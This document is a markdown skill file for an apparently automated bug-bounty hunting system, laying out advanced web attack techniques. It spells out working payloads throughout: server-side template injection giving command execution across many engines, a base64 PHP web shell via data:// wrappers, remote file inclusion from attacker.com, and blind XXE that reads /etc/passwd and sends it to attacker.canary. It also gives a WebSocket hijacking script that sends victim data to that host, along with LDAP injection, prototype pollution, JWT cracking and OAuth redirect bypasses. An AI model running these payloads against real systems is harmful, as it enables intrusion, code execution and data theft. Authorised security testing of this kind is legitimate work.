---
name: hunt-advanced-misc
description: Advanced miscellaneous hunting techniques — HTTP parameter pollution, host header injection, email-based attacks, DNS rebinding, HTTP method override, client-side storage analysis, cryptography weaknesses (JWT brute force, predictable tokens, weak random), server-side prototype pollution, RFI / PHP wrappers, LDAP injection, SSTI across all template engines, deep XXE (OOB + via uploads), IDOR depth techniques (UUID prediction, hash crack, sequential enum, second-order), clickjacking double-click + drag-drop, WebSocket hijacking + message tampering, OAuth deep tests, SAML XML signature wrapping. Use when the standard hunt skills are dry and you need to exhaust advanced vectors before declaring the surface clean.
---

# Advanced Miscellaneous Hunting Techniques

This skill is the "exhaust the surface" playbook — load it after the standard skills run dry on an endpoint that *should* be vulnerable, or when running Wave 5 / Wave 6 of the /hunt system.

Every section ends with a one-line "Validate" rule. Only findings that pass Validate go to leads/.

---

## 1. HTTP Parameter Pollution

Test every endpoint with duplicate parameters:
- Query string: `GET /api/users?role=user&role=admin`
- Form body: `username=normal&username=admin&password=test`
- JSON: `{"role":"user","role":"admin"}` (some parsers keep the last)
- Array syntax: `?role[]=user&role[]=admin`
- Comma-separated: `?role=user,admin`

What to look for:
- Different servers prefer first / last / merged value
- WAF inspects first parameter, backend uses last → bypass
- Filter accepts `role=user` but backend uses `role=admin`

Validate: a duplicate-parameter request returns a response or grants access that the single-parameter equivalent does not.

---

## 2. Host Header Injection

Test password reset and any email-generating flow with an injected `Host`:
```
POST /forgot-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

Also test these header variants:
- `X-Forwarded-Host: evil.com`
- `X-Forwarded-Server: evil.com`
- `X-Host: evil.com`
- Absolute URL in request line: `POST https://evil.com/forgot-password HTTP/1.1`
- Double-Host: send `Host: target.com` and a second `Host: evil.com`

Cache-poisoning variant: do the same but check whether the poisoned response is cached and served to other users.

Validate: the email or response contains `evil.com` (your canary) instead of the real host. For cache poisoning: a second clean request still returns the poisoned content.

---

## 3. Email-Based Attacks

**Password reset poisoning** — see Host header injection above. Confirm that the reset email's reset-link points to your canary host.

**Email enumeration via timing**:
- Time the response for an existing account (already registered) vs a non-existing account
- Run each 10 times, compute mean
- Difference > 100 ms = enumerable

**ATO via email change**:
- Change email without password confirmation → request password reset to new email → take over
- Change email, then request reset to old email → reset link arrives at attacker mailbox if the old email is still in the queue

Validate: actually receive the canary email at an attacker-controlled inbox, OR demonstrate timing distinguishability with a 95% confidence interval.

---

## 4. DNS Rebinding (SSRF allowlist bypass)

When the SSRF target blocks `127.0.0.1` / `169.254.169.254`:
- Use a DNS-rebinding service that first returns `1.2.3.4` (public), then `127.0.0.1` on the second request
- Public testing endpoints: `*.localtest.me`, `*.lvh.me`, `*.nip.io`, `*.sslip.io` resolve to `127.0.0.1`
- Self-hosted: `tbdns.net`, `rebinder.online`

Payloads:
- `http://127.0.0.1.nip.io/`
- `http://localtest.me/admin`
- `http://7f000001.nip.io/` (hex-encoded 127.0.0.1)

Validate: the SSRF reaches an internal service after the second DNS resolution (confirm via OOB callback or internal-content read-back).

---

## 5. HTTP Method Override

On any endpoint, attempt to change the method via headers and body:
- `X-HTTP-Method-Override: DELETE`
- `X-HTTP-Method: PUT`
- `X-Method-Override: PATCH`
- Body parameter `_method=DELETE`
- Query parameter `?_method=DELETE`

Specifically check:
- GET requests to endpoints that should be POST-only (read action becomes write)
- Send DELETE on a GET-only resource via override → unintended deletion
- Send a method the WAF doesn't inspect (TRACE, CONNECT, custom verbs)

Validate: server actually performs the overridden action (resource state changes).

---

## 6. Client-Side Storage Analysis (Playwright)

After login, dump every storage surface:
```python
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    b = p.chromium.launch(headless=True, args=["--no-sandbox"])
    ctx = b.new_context(storage_state="recon/sessions/ADMIN.json")
    page = ctx.new_page()
    page.goto(DASHBOARD)
    page.wait_for_load_state("networkidle")

    local = page.evaluate("() => JSON.stringify(localStorage)")
    session = page.evaluate("() => JSON.stringify(sessionStorage)")
    cookies = page.evaluate("() => document.cookie")
    indexed = page.evaluate("""async () => {
        const dbs = await indexedDB.databases();
        return dbs.map(d => d.name);
    }""")

    print("localStorage:", local[:500])
    print("sessionStorage:", session[:500])
    print("cookies:", cookies[:500])
    print("indexedDB:", indexed)
    ctx.close(); b.close()
```

What to look for: bearer tokens, refresh tokens, API keys, internal IDs, PII, feature flags, debug flags, role / permissions data the client trusts.

Validate: token or PII present in storage that the user role should NOT have access to, OR a flag that controls authorization on the client (trivially flipped).

---

## 7. Cryptography Issues

**JWT secret brute force** (HS256 / HS384 / HS512):
```bash
# Hashcat
echo "$JWT_TOKEN" > jwt.txt
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --force

# Python sanity check after crack
python3 -c "import jwt; print(jwt.decode('$JWT_TOKEN', 'cracked_secret', algorithms=['HS256']))"
```
Try wordlists in this order: rockyou.txt → SecLists/Passwords/Common-Credentials → custom (company name, target domain, common app secrets like `secret`, `secretkey`, `your-256-bit-secret`).

**Predictable token analysis**:
- Collect 10+ tokens of the same type (password reset, email-verify, magic-link, API key)
- Check for: shared prefix, embedded timestamp (epoch / ISO), monotonic counter, low entropy in any position
- Python sanity:
```python
tokens = ["...", "..."]
import base64, statistics
for t in tokens:
    print(len(t), t[:12], t[-12:])
# Look for static prefixes, decode base64-like segments
```

**Weak random detection**: pull 5 password-reset tokens within a 10-second window. Plot their hex/byte distribution — if entropy < 4 bits/byte or a pattern emerges, the RNG is broken.

Validate: a previously-unseen valid token is forged (or guessed within feasible budget) and accepted by the server.

---

## 8. Server-Side Prototype Pollution

Test every JSON PATCH/PUT/POST endpoint with:
```json
{"__proto__": {"isAdmin": true}}
{"__proto__": {"role": "admin"}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"__proto__.isAdmin": true}
```

After sending the polluted body, make a follow-up request to a normal endpoint and look for:
- Response includes `isAdmin: true` where it shouldn't
- Authorization decision flips (low-priv account suddenly reaches admin route)
- A subsequent JSON body that was supposed to default a field now carries `admin` instead

Common pollution sinks: `merge`, `extend`, `defaultsDeep`, `Object.assign({}, userInput)`, body parsers based on `qs`.

Validate: a follow-up request that should fail (403/401) succeeds (200) after pollution, and reverts after a fresh session.

---

## 9. Remote File Inclusion

Test file/path parameters with remote URLs hosted on an attacker-controlled server:
- `?file=http://attacker.com/shell.txt`
- `?page=http://attacker.com/evil`
- `?template=http://attacker.com/payload`
- `?include=ftp://attacker.com/file`
- `?load=//attacker.com/payload` (protocol-relative)

Host `shell.txt` with a unique canary string; if the canary appears in the response → RFI confirmed.

Validate: canary content from the attacker host appears in the server response.

---

## 10. PHP Wrappers (only if PHP stack)

- `?file=php://filter/convert.base64-encode/resource=index.php` — read source
- `?file=php://input` with POST body `<?php system('id'); ?>` — eval body
- `?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=` — inline code
- `?file=expect://id` — requires expect extension, rare but devastating
- `?file=zip://shell.zip%23shell.php` — execute file inside uploaded zip
- `?file=phar://uploads/avatar.jpg/shell` — phar deserialization

Validate: the canary command's output (`id`, `whoami`, `hostname`) appears in the response.

---

## 11. LDAP Injection

Login form payloads:
- Username: `*)(uid=*))(|(uid=*`, password: anything
- Username: `admin)(&(password=*)`, password: anything
- Username: `*`, password: `*`
- Username: `admin)(|(1=1)`, password: anything

Search / filter field payloads:
- `?search=*)(objectClass=*)`
- `?filter=)(|(cn=*`
- `?q=*))%00`

Validate: authenticated as a user without supplying that user's password, OR the search response leaks LDAP attributes that the role should not see.

---

## 12. Weak Randomness Deep Dive

Request 10 of every reset/invite/session token within a short window and analyze:
```python
import statistics
tokens = ["t1","t2","..."]
# Common prefix
prefix = next((c for i,c in enumerate(tokens[0]) if all(t[i]==c for t in tokens)), "")
# Length variance
lengths = [len(t) for t in tokens]
# Inter-token byte deltas (if hex/base64)
print("prefix:", prefix, "lengths:", lengths)
```

Indicators of weak RNG:
- Long shared prefix (RNG re-seeded with same value)
- Predictable suffix pattern (counter / timestamp)
- Length variance of zero AND visible structure
- Tokens decode to plaintext fields (`base64(user_id + epoch)`)

Validate: a synthesized token (predicted from the pattern) is accepted by the server for a target account.

---

## 13. SSTI Across All Engines

Probe sequence (each on every reflected field):
- Jinja2 (Python / Flask): `{{7*7}}` → 49; escalate via `{{config}}`, `{{''.__class__.__mro__[1].__subclasses__()}}`, `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`
- Twig (PHP / Symfony): `{{7*7}}` → 49; `{{dump(app)}}`, `{{app.request.server.all|join(',')}}`, `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
- Freemarker (Java): `${7*7}` → 49; `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- Velocity (Java): `#set($x=7*7)${x}`; `#set($s="")#set($r=$s.class.forName("java.lang.Runtime").getRuntime().exec("id"))`
- Pebble (Java): `{{7*7}}`; `{% for i in range(0,3) %}{{i}}{% endfor %}`
- Smarty (PHP): `{$smarty.version}`; `{php}echo `id`;{/php}`; `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php phpinfo(); ?>",self::clearConfig())}`
- ERB (Ruby): `<%= 7*7 %>`; `<%= `id` %>`; `<%= system("id") %>`
- Handlebars (JS): `{{#with "s" as |string|}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return process.mainModule.require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}`
- Mako (Python): `<%! import os %>${os.popen('id').read()}`

Blind SSTI: if no output reflects, try `{{sleep(5)}}` / `${T(java.lang.Thread).sleep(5000)}` / `<%= sleep(5) %>` and look for the timing oracle.

Validate: the canary command output appears in the response, OR the timing oracle proves execution.

---

## 14. XXE Deep

**Blind XXE via OOB**:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://attacker.canary/evil.dtd">
%ext;
]>
<root>&send;</root>
```
And on `attacker.canary/evil.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.canary/?x=%file;'>">
%eval;
%send;
```

**XXE via file upload**:
- SVG: `<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>`
- DOCX: unzip the `.docx`, edit `word/document.xml`, inject DOCTYPE + entity ref, re-zip
- XLSX: same approach on `xl/workbook.xml`
- Plain XML config / SOAP / SAML endpoints

**XXE via Content-Type swap**: take a JSON endpoint, send `Content-Type: application/xml` with XXE payload — some parsers accept either.

Validate: file content from inside the server reaches the attacker canary (OOB) or the response (in-band).

---

## 15. IDOR Deep Techniques

**UUID prediction**:
```python
import uuid
u = uuid.UUID("550e8400-e29b-11d4-a716-446655440000")
print("version:", u.version)   # 1 = timestamp-based → predictable
print("time:", u.time)
```
v1 UUIDs leak MAC + timestamp → enumerate sibling UUIDs by adjusting the time field.

**Hash-based IDs**:
- 32-hex string → likely MD5. Try MD5(email), MD5(user_id), MD5(email+salt).
- 40-hex → SHA1, same approach
- 64-hex → SHA256. Reverse via rainbow-table (hashes.com) for emails, numeric IDs.

**Sequential enumeration**:
- Numeric: try `id-1`, `id+1`, `id*2`, large skips
- Base64-wrapped: decode, increment, re-encode
- Padded numeric (`u00001234`): increment the numeric portion

**Second-order IDOR**:
- Set your `display_name`/`username` to a victim ID value
- Use a downstream feature (export, report, share) that later uses your stored value as a lookup key
- Result: the second-order feature serves victim's data

Validate: a different user's resource is fetched / modified using the IDOR technique.

---

## 16. Clickjacking Deep

**Double-click attack**:
- Host a page with two stacked iframes; first click primes a critical action, second click confirms (e.g. "delete account" → "yes I'm sure")
- Use `pointer-events: none` and timed `setTimeout` to align the second click with the confirm button

**Drag-and-drop attack**:
- Host a page that asks user to drag a "puzzle piece" — the drag source is a sensitive field inside an iframe (CSRF token, OAuth code)
- The drop target is an attacker form that submits the dropped content

Only valid if `X-Frame-Options` missing/permissive AND `frame-ancestors` CSP missing/permissive AND the framed action is sensitive (account delete, payment, role change).

Validate: working HTML PoC that performs the sensitive action against your own test account without you clicking the real button.

---

## 17. WebSocket Deep

**Cross-Site WebSocket Hijacking (CSWSH)**:
```html
<!-- attacker.com page -->
<script>
const ws = new WebSocket("wss://target.com/ws");
ws.onmessage = e => fetch("https://attacker.canary/x?d=" + btoa(e.data));
</script>
```
If the WS server authenticates via cookies alone (no Origin check, no per-message CSRF token), attacker-origin JS connects with the victim's session cookies.

**Message tampering**: intercept WS frames in Burp, modify payloads (`role: user` → `role: admin`, `room_id: own` → `room_id: victim`). Test every message type.

**Auth bypass on upgrade**:
- Send WS upgrade with no `Authorization` / cookies — server should reject
- Send upgrade with expired token
- Send upgrade with a different user's token then issue commands

Validate: cross-user data leak (read messages from another user's room), OR privileged action executed (role escalation via WS).

---

## 18. OAuth Deep Testing

**Token leakage in Referer**: complete OAuth flow; inspect every cross-origin GET that follows. If `access_token=...` appears in the URL of any third-party referer, leak = High.

**Redirect URI bypass** (try every variant against the IdP):
- `https://target.com.evil.com/callback`
- `https://target.com@evil.com/callback`
- `https://target.com/callback/../evil`
- `https://target.com/callback?redirect=https://evil.com`
- `https://target.com%2F@evil.com/callback`
- `https://target.com/callback#@evil.com`
- `https://evil.com#https://target.com/callback`
- IP/hex/octal encoding for `evil.com`
- Open redirect on `target.com` chained as `redirect_uri`

**State parameter reuse**: complete one OAuth flow, capture `state`, attempt to reuse the same `state` in a second flow. If accepted → CSRF on OAuth callback.

**PKCE bypass**:
- If server advertises PKCE: redeem the auth code WITHOUT `code_verifier`
- Try a weak / static verifier (`abc`, `0`, empty)
- Try a `code_challenge_method=plain` downgrade

Validate: an auth code or access token belonging to a victim is redeemed against the attacker's client.

---

## 19. SAML Deep

**XML Signature Wrapping (XSW1–XSW8)**:
- Duplicate the `<saml:Assertion>` element
- Modify the unsigned copy (change `NameID` to admin)
- Keep the signed original intact in a different location of the document
- Server validates signature on original, processes unsigned modified copy
- Use SAML Raider Burp extension to automate all eight XSW variants

**Comment injection in NameID**:
- Register with email `admin<!---->@target.com`
- SAML strips the comment → assertion contains `admin@target.com`
- SP grants access to the admin account
- Variant: `victim@attacker.com<!---->@target.com`

**XXE via SAML**: inject `<!DOCTYPE assertion [<!ENTITY xxe SYSTEM "...">]>` into the SAML XML and look for XXE-style file disclosure.

Validate: authenticated as a user whose credentials you do not possess (signature wrapping), OR XXE confirmation via OOB.

---

## Methodology

Run the sections in this order when Wave 5 / Wave 6 fires:
1. Sections 1, 2, 5 (header-level) — cheap, fast, high ROI
2. Sections 3, 4 (email/DNS) — needs OOB infra
3. Sections 7, 8, 12 (crypto / pollution / RNG) — high impact
4. Sections 13, 14 (SSTI, XXE) — deep injection
5. Sections 15, 17, 18, 19 (IDOR/WS/OAuth/SAML) — chain candidates
6. Sections 6, 9, 10, 11, 16 (storage / RFI / wrappers / LDAP / clickjack) — fill gaps

Anything passing Validate → leads/. Anything passing 7-Q → findings/.

Never invent impact. PoC or GTFO.
